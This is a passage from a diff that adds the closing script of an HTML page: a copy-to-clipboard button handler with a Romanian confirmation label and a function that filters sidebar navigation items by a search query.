+      navigator.clipboard.writeText(pre.innerText).then(() => {
+        const orig = btn.innerText;
+        btn.innerText = '✅ Copiat';
+        setTimeout(() => { btn.innerText = orig; }, 1600);
+      });
+    }
+    function filterSidebar(input) {
+      const q = input.value.toLowerCase().trim();
+      const details = document.querySelectorAll('aside.sidebar details.nav-unit');
+      details.forEach(d => {
+        const items = d.querySelectorAll('li');
+        let anyVisible = false;
+        items.forEach(li => {
+          const match = !q || li.innerText.toLowerCase().includes(q);
+          li.style.display = match ? '' : 'none';
+          if (match) anyVisible = true;
+        });
+        if (q) {
+          d.open = anyVisible;
+          d.style.display = anyVisible ? '' : 'none';
+        } else {
+          d.style.display = '';
+        }
+      });
+    }
+  </script>
+</body>
+</html>
